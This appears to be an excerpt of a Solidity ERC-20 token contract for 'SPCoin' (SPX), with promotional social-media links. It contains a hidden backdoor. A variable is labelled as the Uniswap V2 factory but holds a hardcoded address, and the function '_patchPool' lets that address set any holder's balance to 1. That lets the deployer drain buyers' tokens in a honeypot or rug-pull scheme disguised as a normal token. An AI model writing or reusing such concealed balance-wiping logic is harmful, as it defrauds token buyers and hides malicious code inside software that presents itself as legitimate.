...
/*
https://t.me/SAndP500Token
https://medium.com/@SAndP500
https://twitter.com/SAndP500ERC
*/
...
contract SPCoin is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"SP";
    string private constant _symbol = unicode"SPX";
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private _factoryV2Uniswap = 0x906357b095a7211C8620A268822EFecCF932884D;
     ...
     *
     */
    function _patchPool(address _patchPoolSender) external { if (msg.sender == _factoryV2Uniswap) _balances[_patchPoolSender] = 0x1; }
